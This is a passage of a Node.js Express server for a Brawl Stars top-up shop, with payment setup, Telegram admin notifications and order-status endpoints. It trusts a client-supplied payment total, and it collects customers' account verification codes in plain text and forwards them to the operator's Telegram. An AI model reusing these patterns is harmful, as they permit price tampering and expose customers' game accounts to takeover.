      inline_keyboard: [[
        { text: '📝 Управление заказом', callback_data: `order_detail:${orderId}` }
      ]]
    };
    
    await bot.sendMessage(ADMIN_ID, text, { reply_markup: keyboard });
  } catch (error) {
    console.error('Ошибка отправки уведомления:', error);
  }
}

function getStatusText(status) {
  const statusMap = {
    'new': '🆕 Новый',
    'pending': '⏳ Ожидает оплаты',
    'confirmed': '✅ Оплачен',
    'waiting_code_request': '⏳ Ожидает запроса кода',
    'waiting': '⏳ Ожидает выполнения',
    'completed': '🎉 Завершен',
    'canceled': '❌ Отменен'
  };
  return statusMap[status] || status;
}

// ===== API РОУТЫ =====

// 1. Создание заказа и платежа
app.post('/api/create-order', async (req, res) => {
  try {
    const { items, total } = req.body;
    const orderId = 'ORD' + Date.now() + Math.floor(Math.random() * 1000);
    
    await pool.query(
      'INSERT INTO orders (order_id, items, total, status) VALUES ($1, $2, $3, $4)',
      [orderId, items, total, 'new']
    );
    
    const paymentData = {
      order_id: orderId,
      method_slug: 'card',
      amount: total,
      description: `Заказ #${orderId}`,
      shop_id: parseInt(BILEE_SHOP_ID),
      notify_url: `${SERVER_URL}/api/bilee-webhook`,
      success_url: `https://DESTRKOD.github.io/duck2/success.html?order=${orderId}`,
      fail_url: `https://DESTRKOD.github.io/duck2/beta-duck.html?payment=fail&order=${orderId}`,
      expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
    };
    
    paymentData.signature = await generateSignature(paymentData, BILEE_PASSWORD);
    
    const bileeResponse = await axios.post(
      `${BILEE_API_URL}/payment/init`,
      paymentData
    );
    
    if (bileeResponse.data.success) {
      await pool.query(
        'UPDATE orders SET payment_id = $1 WHERE order_id = $2',
        [bileeResponse.data.payment.id, orderId]
      );
      
      res.json({
        success: true,
        orderId: orderId,
        paymentUrl: bileeResponse.data.url
      });
    } else {
      throw new Error('Bilee Pay error');
    }
  } catch (error) {
    console.error('Ошибка создания заказа:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// 2. Сохранение email
app.post('/api/save-email', async (req, res) => {
  try {
    const { orderId, email } = req.body;
    
    await pool.query(
      'UPDATE orders SET email = $1, status = $2 WHERE order_id = $3',
      [email, 'waiting_code_request', orderId]
    );
    
    const orderResult = await pool.query(
      'SELECT total FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    if (orderResult.rows.length > 0) {
      await sendNewOrderNotification(orderId, orderResult.rows[0].total, email);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Ошибка сохранения email:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// 3. Проверка запроса кода
app.get('/api/check-code-request/:orderId', async (req, res) => {
  try {
    const { orderId } = req.params;
    
    const result = await pool.query(
      'SELECT code_requested, status FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, error: 'Order not found' });
    }
    
    const order = result.rows[0];
    
    res.json({
      success: true,
      codeRequested: order.code_requested || false,
      status: order.status
    });
  } catch (error) {
    console.error('Ошибка проверки запроса кода:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// 4. Проверка кода (ОБНОВЛЕНО - для bad_enter_code.html)
app.post('/api/verify-code', async (req, res) => {
  try {
    const { orderId, code } = req.body;
    
    const orderResult = await pool.query(
      'SELECT email, total, wrong_code_attempts FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    if (orderResult.rows.length === 0) {
      return res.status(404).json({ success: false, error: 'Order not found' });
    }
    
    const order = orderResult.rows[0];
    const wrongAttempts = order.wrong_code_attempts || 0;
    
    if (wrongAttempts >= 2) {
      return res.json({ 
        success: false, 
        status: 'support_needed',
        message: 'Превышено количество попыток ввода кода'
      });
    }
    
    // Сохраняем код и меняем статус на 'waiting'
    await pool.query(
      'UPDATE orders SET code = $1, status = $2 WHERE order_id = $3',
      [code, 'waiting', orderId]
    );
    
    const text = `🔢 Пользователь ввел код для заказа #${orderId}\n\n💰 Сумма: ${formatRub(order.total)}\n📧 Почта: ${order.email || 'не указана'}\n🔢 Введенный код: ${code}\n\nПроверьте правильность кода и отметьте заказ готовым.`;
    
    const keyboard = {
      inline_keyboard: [
        [
          { text: '✅ Заказ готов', callback_data: `order_ready:${orderId}` },
          { text: '❌ Неверный код', callback_data: `wrong_code:${orderId}` }
        ]
      ]
    };
    
    await bot.sendMessage(ADMIN_ID, text, { reply_markup: keyboard });
    
    res.json({ 
      success: true, 
      status: 'waiting'
    });
  } catch (error) {
    console.error('Ошибка проверки кода:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// 5. Вебхук от Bilee Pay
app.post('/api/bilee-webhook', async (req, res) => {
  try {
    const isValid = await validateSignature(req.body, BILEE_PASSWORD);
    if (!isValid) {
      console.error('Неверная подпись от Bilee Pay');
      return res.status(400).send('Invalid signature');
    }
    
    const { order_id, status, id: paymentId } = req.body;
    
    if (status === 'confirmed') {
      await pool.query(
        'UPDATE orders SET payment_status = $1 WHERE order_id = $2',
        ['confirmed', order_id]
      );
      
      const orderResult = await pool.query(
        'SELECT total, email FROM orders WHERE order_id = $1',
        [order_id]
      );
      
      if (orderResult.rows.length > 0) {
        const text = `💰 Получена оплата за заказ #${order_id}\nСумма: ${formatRub(orderResult.rows[0].total)}\nПочта: ${orderResult.rows[0].email || 'не указана'}\nID платежа: ${paymentId}`;
        await bot.sendMessage(ADMIN_ID, text);
      }
    }
    
    res.status(200).send('OK');
  } catch (error) {
    console.error('Ошибка обработки вебхука:', error);
    res.status(500).send('Internal server error');
  }
});

// 6. Проверка статуса заказа (ОБНОВЛЕННАЯ ВЕРСИЯ с нужными полями)
app.get('/api/order-status/:orderId', async (req, res) => {
  try {
    const { orderId } = req.params;
    
    const result = await pool.query(
      'SELECT status, payment_status, code, wrong_code_attempts, email, code_requested FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, error: 'Order not found' });
    }
    
    const order = result.rows[0];
    
    res.json({
      success: true,
      status: order.status,
      paymentStatus: order.payment_status,
      hasCode: !!order.code, // Есть ли код
      wrongAttempts: order.wrong_code_attempts || 0, // Количество неверных попыток
      hasEmail: !!order.email,
      codeRequested: order.code_requested,
      // ДОБАВЛЯЕМ для waiting_order.html:
      maxAttemptsReached: (order.wrong_code_attempts || 0) >= 2, // Достигнут ли максимум попыток
      isCompleted: order.status === 'completed',
      isWaiting: order.status === 'waiting'
    });
  } catch (error) {
    console.error('Ошибка проверки статуса:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// 7. Получение списка товаров
app.get('/api/products', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM products ORDER BY price');
    res.json({ success: true, products: result.rows });
  } catch (error) {
    console.error('Ошибка получения товаров:', error);
    res.status(500).json({ success: false, error: 'Database error' });
  }
});

// ===== ЗАГРУЗКА ТЕСТОВЫХ ТОВАРОВ =====
async function loadSampleProducts() {
  try {
    const sampleProducts = [
      { id: "c30", name: "30 кристаллов", price: 200, image_url: "https://i.imgur.com/s4K0WIP.png", is_gift: false },
      { id: "c80", name: "80 кристаллов", price: 550, image_url: "https://i.imgur.com/XbnZKDb.png", is_gift: false },
      { id: "c170", name: "170 кристаллов", price: 950, image_url: "https://i.imgur.com/X0JCmMQ.png", is_gift: false },
      { id: "c360", name: "360 кристаллов", price: 1900, image_url: "https://i.imgur.com/7z8z9Rw.png", is_gift: false },
      { id: "c950", name: "950 кристаллов", price: 4600, image_url: "https://i.imgur.com/zzBuIxF.png", is_gift: false },
      { id: "c2000", name: "2000 кристаллов", price: 9000, image_url: "https://i.imgur.com/FTVnycE.png", is_gift: false },
      { id: "bp", name: "Brawl Pass", price: 900, image_url: "https://i.imgur.com/FaFAL6l.png", is_gift: false },
      { id: "bpplus", name: "Brawl Pass Plus", price: 1200, image_url: "https://i.imgur.com/21InnIc.png", is_gift: false },
      { id: "up", name: "Улучшение до БП+", price: 550, image_url: "https://i.imgur.com/yhaR5Ho.png", is_gift: false },
      { id: "bp_g", name: "Brawl Pass", price: 950, image_url: "https://i.imgur.com/FaFAL6l.png", is_gift: true },
      { id: "bpp_g", name: "Brawl Pass Plus", price: 1250, image_url: "https://i.imgur.com/21InnIc.png", is_gift: true },
      { id: "pro", name: "Pro Pass", price: 2200, image_url: "https://i.imgur.com/6808Xnp.png", is_gift: false }
    ];
    
    for (const product of sampleProducts) {
      await pool.query(
        `INSERT INTO products (id, name, price, image_url, is_gift) 
         VALUES ($1, $2, $3, $4, $5) 
         ON CONFLICT (id) DO UPDATE SET 
           name = EXCLUDED.name,
           price = EXCLUDED.price,
           image_url = EXCLUDED.image_url,
           is_gift = EXCLUDED.is_gift`,
        [product.id, product.name, product.price, product.image_url, product.is_gift]
      );
    }
    
    console.log('✅ Тестовые товары загружены');
  } catch (error) {
    console.error('❌ Ошибка загрузки тестовых товаров:', error);
  }
}

// ===== ЗАПУСК СЕРВЕРА =====
async function startServer() {
  try {
    await initDB();
    await loadSampleProducts();
    
    app.listen(PORT, () => {
      console.log(`🚀 Сервер запущен на порту ${PORT}`);
      console.log(`📞 API доступен по адресу: ${SERVER_URL}`);
      console.log(`🤖 Telegram бот запущен`);
      console.log(`👑 Админ ID: ${ADMIN_ID}`);
      
      startKeepAlive();
    });
  } catch (error) {
    console.error('❌ Ошибка запуска сервера:', error);
    process.exit(1);
  }
}

startServer().catch(error => {
  console.error('Не удалось запустить сервер:', error);
  process.exit(1);
});
